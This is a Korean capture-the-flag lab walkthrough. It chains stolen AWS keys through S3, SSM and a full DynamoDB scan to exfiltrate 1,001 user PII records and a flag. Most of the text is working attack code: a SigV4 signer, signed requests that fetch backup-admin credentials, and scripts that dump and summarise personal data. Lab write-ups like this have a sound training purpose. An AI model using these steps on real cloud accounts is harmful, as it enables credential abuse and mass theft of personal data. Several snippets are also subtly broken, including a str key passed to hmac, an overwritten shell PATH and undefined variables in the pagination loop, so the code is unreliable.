# Stage 4 상세 공략 가이드: AWS API 체인 → PII 유출

**목표**: Stage 3에서 획득한 AWS 자격증명을 이용하여 AWS API를 통해 DynamoDB의 모든 사용자 정보(PII) 및 최종 flag 획득

---

## 📋 개요

이 stage에서는 AWS SigV4 인증을 이용하여:
1. S3에서 backup-admin 자격증명 조회
2. backup-admin 권한으로 SSM Parameter Store 접근
3. DynamoDB 전체 테이블 스캔 (1001 user records)
4. 최종 flag 추출 (`FLAG{ssm_plaintext_to_pii_exfiltration}`)

---

## 🔑 준비물

### Stage 3에서 획득한 정보
```
AWS_ACCESS_KEY_ID = AKIA... (www-data 권한)
AWS_SECRET_ACCESS_KEY = wJal...
AWS_REGION = us-east-1 (추정)
```

### 필요한 도구
```bash
# Python 3
python3 --version

# curl
curl --version

# 암호화 라이브러리
pip install requests
pip install boto3 (선택)
```

---

## Step 1: AWS 자격증명 환경 설정

### 1.1 Stage 3 자격증명 확보

Stage 3에서 /etc/sudoers 파일에서 추출한 정보:

```bash
# 예시 (실제 값으로 교체 필요)
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="<REDACTED>"
export AWS_REGION="us-east-1"
export AWS_SESSION_TOKEN=""  # 필요시
```

### 1.2 자격증명 확인

```bash
# 환경변수 설정 확인
echo "Access Key: $AWS_ACCESS_KEY_ID"
echo "Secret Key: $AWS_SECRET_ACCESS_KEY"
echo "Region: $AWS_REGION"

# AWS CLI가 있다면:
aws sts get-caller-identity
# 출력 예: Account: 123456789012, UserId: AIDAI..., Arn: arn:aws:iam::123456789012:user/www-data
```

---

## Step 2: AWS SigV4 서명 구현

### 2.1 SigV4 서명 프로세스 이해

AWS API 호출은 **서명**이 필수입니다:

```
Request Headers
    ↓
정규 요청 생성 (Canonical Request)
    ↓
서명할 문자열 생성 (String to Sign)
    ↓
서명 키 도출 (Signature Key Derivation)
    ↓
HMAC-SHA256 서명
    ↓
Authorization 헤더 추가
    ↓
AWS API 호출
```

### 2.2 Python SigV4 구현

```python
#!/usr/bin/env python3
"""
AWS SigV4 Request Signing
"""

import hashlib
import hmac
import datetime
import sys

def sign(key, msg):
    """HMAC-SHA256 서명"""
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

def get_signature_key(key, dateStamp, regionName, serviceName):
    """SigV4 서명 키 도출"""
    kDate = sign(("AWS4" + key), dateStamp)
    kRegion = sign(kDate, regionName)
    kService = sign(kRegion, serviceName)
    kSigning = sign(kService, "aws4_request")
    return kSigning

def create_sig4_auth(
    method, host, canonical_uri,
    access_key, secret_key, region, service,
    payload=None
):
    """
    SigV4 인증 헤더 생성
    
    Parameters:
    - method: GET, POST, etc.
    - host: s3.us-east-1.amazonaws.com
    - canonical_uri: /bucket/key
    - access_key: AWS_ACCESS_KEY_ID
    - secret_key: AWS_SECRET_ACCESS_KEY
    - region: us-east-1
    - service: s3, dynamodb, etc.
    - payload: POST 요청 본문
    
    Returns: dict with Authorization headers
    """
    
    # 1. 타임스탬프 생성
    t = datetime.datetime.utcnow()
    amz_date = t.strftime('%Y%m%dT%H%M%SZ')
    date_stamp = t.strftime('%Y%m%d')
    
    # 2. Payload 해시
    if payload is None:
        payload = ""
    payload_hash = hashlib.sha256(payload.encode()).hexdigest()
    
    # 3. 정규 요청 (Canonical Request) 생성
    canonical_headers = (
        f"host:{host}\n"
        f"x-amz-date:{amz_date}\n"
    )
    signed_headers = "host;x-amz-date"
    
    canonical_request = (
        method + '\n' +
        canonical_uri + '\n' +
        '' + '\n' +  # Query string (empty)
        canonical_headers + '\n' +
        signed_headers + '\n' +
        payload_hash
    )
    
    print("[DEBUG] Canonical Request:")
    print(canonical_request)
    print()
    
    # 4. 서명할 문자열 생성 (String to Sign)
    canonical_request_hash = hashlib.sha256(
        canonical_request.encode()
    ).hexdigest()
    
    credential_scope = f"{date_stamp}/{region}/{service}/aws4_request"
    
    string_to_sign = (
        "AWS4-HMAC-SHA256\n" +
        amz_date + "\n" +
        credential_scope + "\n" +
        canonical_request_hash
    )
    
    print("[DEBUG] String to Sign:")
    print(string_to_sign)
    print()
    
    # 5. 서명 계산
    signing_key = get_signature_key(secret_key, date_stamp, region, service)
    signature = hmac.new(
        signing_key,
        string_to_sign.encode(),
        hashlib.sha256
    ).hexdigest()
    
    print(f"[DEBUG] Signature: {signature[:20]}...")
    print()
    
    # 6. Authorization 헤더 생성
    authorization_header = (
        f"AWS4-HMAC-SHA256 "
        f"Credential={access_key}/{credential_scope}, "
        f"SignedHeaders={signed_headers}, "
        f"Signature={signature}"
    )
    
    return {
        "Authorization": authorization_header,
        "x-amz-date": amz_date,
        "Host": host
    }

# 테스트
if __name__ == "__main__":
    ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
    SECRET_KEY = "<REDACTED>"
    
    headers = create_sig4_auth(
        method="GET",
        host="s3.us-east-1.amazonaws.com",
        canonical_uri="/backup-bucket/backup-admin/backup-credentials.json",
        access_key=ACCESS_KEY,
        secret_key=SECRET_KEY,
        region="us-east-1",
        service="s3"
    )
    
    print("[RESULT] Authorization Headers:")
    for k, v in headers.items():
        print(f"  {k}: {v[:50]}...")
```

---

## Step 3: S3에서 Backup-Admin 자격증명 조회

### 3.1 S3 GetObject 요청

```bash
#!/bin/bash

# 환경변수 설정
ACCESS_KEY="$AWS_ACCESS_KEY_ID"
SECRET_KEY="$AWS_SECRET_ACCESS_KEY"
REGION="us-east-1"
BUCKET="backup-bucket"
OBJECT="backup-admin/backup-credentials.json"

HOST="s3.${REGION}.amazonaws.com"
PATH="/${BUCKET}/${OBJECT}"

# Python으로 SigV4 서명 생성
HEADERS=$(python3 <<'EOF'
import os
import sys
sys.path.insert(0, '/path/to/sig4_module')

from sig4_auth import create_sig4_auth

headers = create_sig4_auth(
    method="GET",
    host="s3.us-east-1.amazonaws.com",
    canonical_uri="/backup-bucket/backup-admin/backup-credentials.json",
    access_key=os.getenv('AWS_ACCESS_KEY_ID'),
    secret_key=os.getenv('AWS_SECRET_ACCESS_KEY'),
    region="us-east-1",
    service="s3"
)

print(headers['Authorization'])
EOF
)

# S3 요청 실행
curl -X GET \
  -H "Host: ${HOST}" \
  -H "x-amz-date: $(date -u +%Y%m%dT%H%M%SZ)" \
  -H "Authorization: ${HEADERS}" \
  "https://${HOST}${PATH}" \
  -o backup-credentials.json

# 결과 확인
echo "=== S3 Response ==="
cat backup-credentials.json | python3 -m json.tool
```

### 3.2 Backup-Admin 자격증명 추출

```bash
# JSON 파싱
python3 << 'EOF'
import json

with open('backup-credentials.json', 'r') as f:
    creds = json.load(f)

print("[+] Backup-Admin Credentials:")
print(f"  Access Key: {creds['access_key_id']}")
print(f"  Secret Key: {creds['secret_access_key']}")

# 새 환경변수로 설정
import os
os.environ['AWS_BACKUP_ADMIN_KEY'] = creds['access_key_id']
os.environ['AWS_BACKUP_ADMIN_SECRET'] = creds['secret_access_key']
EOF

# 또는 bash로:
export AWS_BACKUP_ADMIN_KEY=$(jq -r '.access_key_id' backup-credentials.json)
export AWS_BACKUP_ADMIN_SECRET=$(jq -r '.secret_access_key' backup-credentials.json)

echo "Backup-Admin Key: $AWS_BACKUP_ADMIN_KEY"
```

**획득 정보**:
```json
{
  "access_key_id": "AKIA...",
  "secret_access_key": "wJal...",
  "session_token": null,
  "created_at": "2025-01-01T00:00:00Z"
}
```

---

## Step 4: SSM Parameter Store 조회 (힌트)

### 4.1 SSM Parameter 읽기

SSM에는 DynamoDB 테이블 정보가 저장되어 있습니다:

```bash
# SSM ParameterStore GetParameter 요청
python3 << 'EOF'
from sig4_auth import create_sig4_auth
import requests
import json

# backup-admin 자격증명 사용
BACKUP_KEY = "..."  # S3에서 획득
BACKUP_SECRET = "..."

# SSM Parameter 읽기
host = "ssm.us-east-1.amazonaws.com"
service = "ssm"

headers = create_sig4_auth(
    method="POST",
    host=host,
    canonical_uri="/",
    access_key=BACKUP_KEY,
    secret_key=BACKUP_SECRET,
    region="us-east-1",
    service=service,
    payload=json.dumps({"Name": "dynamodb-table-config"})
)

# SSM API 호출
headers.update({
    "X-Amz-Target": "AmazonSSM.GetParameter",
    "Content-Type": "application/x-amz-json-1.1"
})

response = requests.post(
    f"https://{host}/",
    headers=headers,
    json={"Name": "dynamodb-table-config"}
)

print("[+] SSM Response:")
print(json.dumps(response.json(), indent=2))
EOF
```

**응답 예**:
```json
{
  "Parameter": {
    "Name": "dynamodb-table-config",
    "Type": "String",
    "Value": "Table: members, Region: us-east-1, Primary Key: id",
    "Version": 1,
    "Selector": "undefined"
  }
}
```

---

## Step 5: DynamoDB 테이블 스캔

### 5.1 DynamoDB Scan 요청

```python
#!/usr/bin/env python3
"""
DynamoDB Scan - 모든 사용자 기록 조회
"""

import json
import requests
from sig4_auth import create_sig4_auth

# backup-admin 자격증명
BACKUP_KEY = "AKIA..."
BACKUP_SECRET = "wJal..."

# DynamoDB Scan 요청 본문
scan_payload = {
    "TableName": "members",
    "Limit": 1000  # 한 번에 1000개까지 조회
}

# SigV4 서명 생성
host = "dynamodb.us-east-1.amazonaws.com"
headers = create_sig4_auth(
    method="POST",
    host=host,
    canonical_uri="/",
    access_key=BACKUP_KEY,
    secret_key=BACKUP_SECRET,
    region="us-east-1",
    service="dynamodb",
    payload=json.dumps(scan_payload)
)

# DynamoDB API 헤더 추가
headers.update({
    "X-Amz-Target": "DynamoDB_20120810.Scan",
    "Content-Type": "application/x-amz-json-1.0"
})

# API 호출
print("[*] Scanning DynamoDB members table...")
response = requests.post(
    f"https://{host}/",
    headers=headers,
    json=scan_payload
)

print(f"[*] Status: {response.status_code}")

if response.status_code == 200:
    result = response.json()
    print(f"[+] Found {len(result.get('Items', []))} records")
    
    # 결과 저장
    with open('dynamodb_scan_result.json', 'w') as f:
        json.dump(result, f, indent=2)
else:
    print(f"[-] Error: {response.text}")
```

### 5.2 Pagination (페이지 나누기)

1001개 기록이 있으므로 여러 번 요청해야 합니다:

```python
def scan_all_members(backup_key, backup_secret):
    """모든 멤버 기록을 페이징하며 조회"""
    
    all_items = []
    exclusive_start_key = None
    request_count = 0
    
    while True:
        request_count += 1
        print(f"[*] Request {request_count}...")
        
        payload = {
            "TableName": "members",
            "Limit": 1000
        }
        
        # 첫 요청 이후부터 ExclusiveStartKey 추가
        if exclusive_start_key:
            payload["ExclusiveStartKey"] = exclusive_start_key
        
        # SigV4 서명 생성 및 API 호출
        # ... (위의 Step 5.1 코드)
        
        items = result.get('Items', [])
        all_items.extend(items)
        
        print(f"  → Retrieved {len(items)} items (total: {len(all_items)})")
        
        # 다음 페이지가 있는지 확인
        exclusive_start_key = result.get('LastEvaluatedKey')
        if not exclusive_start_key:
            break  # 모든 항목 조회 완료
        
        # API 호출 빈도 제한 (2개 요청 사이에 1초)
        time.sleep(1)
    
    return all_items

# 실행
all_members = scan_all_members(BACKUP_KEY, BACKUP_SECRET)
print(f"\n[+] Total members: {len(all_members)}")
```

---

## Step 6: 최종 Flag 추출

### 6.1 Flag 항목 찾기

DynamoDB 스캔 결과에서 flag를 찾습니다:

```python
def find_flag(all_items):
    """DynamoDB 스캔 결과에서 flag 추출"""
    
    for item in all_items:
        # 각 항목의 id 필드 확인
        if item.get('id', {}).get('S') == 'SSM-FLAG':
            flag = item.get('flag', {}).get('S')
            print(f"[+] FLAG FOUND!")
            print(f"    {flag}")
            return flag
    
    return None

# 모든 항목 로드
with open('dynamodb_scan_result.json', 'r') as f:
    result = json.load(f)

flag = find_flag(result.get('Items', []))
```

### 6.2 Flag 형식

```
FLAG{ssm_plaintext_to_pii_exfiltration}
```

**의미**:
- `ssm`: AWS Systems Manager에서 plaintext로 저장된 정보
- `plaintext`: 암호화 없이 평문 저장
- `pii_exfiltration`: PII (Personally Identifiable Information) 유출

---

## Step 7: PII 데이터 분석

### 7.1 사용자 기록 구조

```json
{
  "id": {"S": "M0000"},
  "email": {"S": "john.doe@example.com"},
  "name": {"S": "John Doe"},
  "phone": {"S": "+1-555-123-4567"},
  "address": {"S": "123 Main Street, Springfield, IL 62701"},
  "login_timestamps": {
    "L": [
      {"S": "2026-01-15T10:30:00Z"},
      {"S": "2026-01-16T14:22:15Z"},
      {"S": "2026-01-18T09:45:30Z"}
    ]
  },
  "password_hash": {"S": "sha256:5e884898da28047151d0e56f8dc62927..."},
  "created_at": {"S": "2025-12-01T08:00:00Z"},
  "last_login": {"S": "2026-01-18T09:45:30Z"}
}
```

### 7.2 PII 통계

```python
def analyze_pii(all_items):
    """수집된 PII 데이터 분석"""
    
    total_records = len(all_items)
    user_records = 0
    pii_samples = []
    
    for item in all_items:
        item_id = item.get('id', {}).get('S', '')
        
        # 사용자 기록 (M0000-M0999)
        if item_id.startswith('M'):
            user_records += 1
            
            if len(pii_samples) < 5:  # 처음 5개만 수집
                pii_samples.append({
                    "id": item_id,
                    "email": item.get('email', {}).get('S', 'N/A'),
                    "name": item.get('name', {}).get('S', 'N/A'),
                    "phone": item.get('phone', {}).get('S', 'N/A')
                })
    
    print(f"[+] PII Statistics:")
    print(f"    Total records: {total_records}")
    print(f"    User records: {user_records}")
    print(f"    ID range: M0000 - M{user_records-1}")
    print(f"\n[+] Sample PII Data:")
    
    for sample in pii_samples:
        print(f"    ID: {sample['id']}")
        print(f"    Name: {sample['name']}")
        print(f"    Email: {sample['email']}")
        print(f"    Phone: {sample['phone']}")
        print()

analyze_pii(result.get('Items', []))
```

**출력 예**:
```
[+] PII Statistics:
    Total records: 1001
    User records: 1000
    ID range: M0000 - M0999

[+] Sample PII Data:
    ID: M0000
    Name: John Doe
    Email: john.doe@example.com
    Phone: +1-555-123-4567

    ID: M0001
    Name: Jane Smith
    Email: jane.smith@example.com
    Phone: +1-555-987-6543
    
    ...
```

---

## 📝 요약: Stage 4 공략 체크리스트

- [ ] Step 1: Stage 3에서 AWS 자격증명 확보
- [ ] Step 2: AWS SigV4 서명 구현
- [ ] Step 3: S3에서 backup-admin 자격증명 조회
- [ ] Step 4: SSM Parameter Store에서 힌트 조회
- [ ] Step 5: DynamoDB 테이블 전체 스캔
- [ ] Step 6: 최종 flag 추출
- [ ] Step 7: 수집된 PII 데이터 분석

---

## 🔴 주요 포인트

### Security Flaws Chained (보안 결함 체인)

```
Application Flaw: Roundcube 역직렬화 취약점
    ↓
System Flaw: sudo 권한 설정 (find -exec shell escape)
    ↓
Configuration Flaw: /etc/sudoers에 AWS 키 평문 저장
    ↓
Cloud Flaw: SSM plaintext 저장 + S3 무제한 읽기
    ↓
Database Flaw: DynamoDB 암호화 없음 + 행 권한 없음
    ↓
Data Breach: 1001명 완전한 PII 유출
```

### 공격 성공의 3가지 조건

1. **권한 체인**: www-data → root → AWS IAM → backup-admin → DynamoDB
2. **정보 공개**: 각 단계에서 다음 단계 자격증명 획득 가능
3. **보안 구멍**: 암호화, 접근 제어, 감시 부재

---

## 🏁 최종 성과

```
FLAG{ssm_plaintext_to_pii_exfiltration}
```

**달성 사항**:
- ✅ AWS API 체인 완성
- ✅ 1001 사용자 기록 유출
- ✅ 완전한 PII 데이터셋 획득
- ✅ 최종 flag 확보

---

**다음**: 보고서 작성 및 사건 분석

